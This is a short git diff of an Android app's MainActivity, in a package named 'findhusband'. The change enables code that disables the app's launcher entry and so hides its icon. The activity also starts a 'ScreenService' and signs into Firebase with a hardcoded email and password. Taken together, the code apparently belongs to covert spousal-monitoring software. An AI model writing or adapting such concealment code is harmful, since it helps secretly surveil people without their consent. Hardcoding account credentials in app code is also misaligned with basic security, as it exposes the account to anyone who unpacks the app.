@@ -68,9 +68,9 @@ class MainActivity : AppCompatActivity() {
         }
         startService(Intent(this@MainActivity, ScreenService::class.java))
 
-        //  val p = packageManager
-        // val componentName = ComponentName(this@MainActivity, nguyen.findhusband.MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
-        // p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+          val p = packageManager
+         val componentName = ComponentName(this@MainActivity, nguyen.findhusband.MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+         p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
         mAuth!!.signInWithEmailAndPassword("thanhluan@gmail.com", "123456789")
                 .addOnCompleteListener(this) { task ->
                     if (task.isSuccessful) {
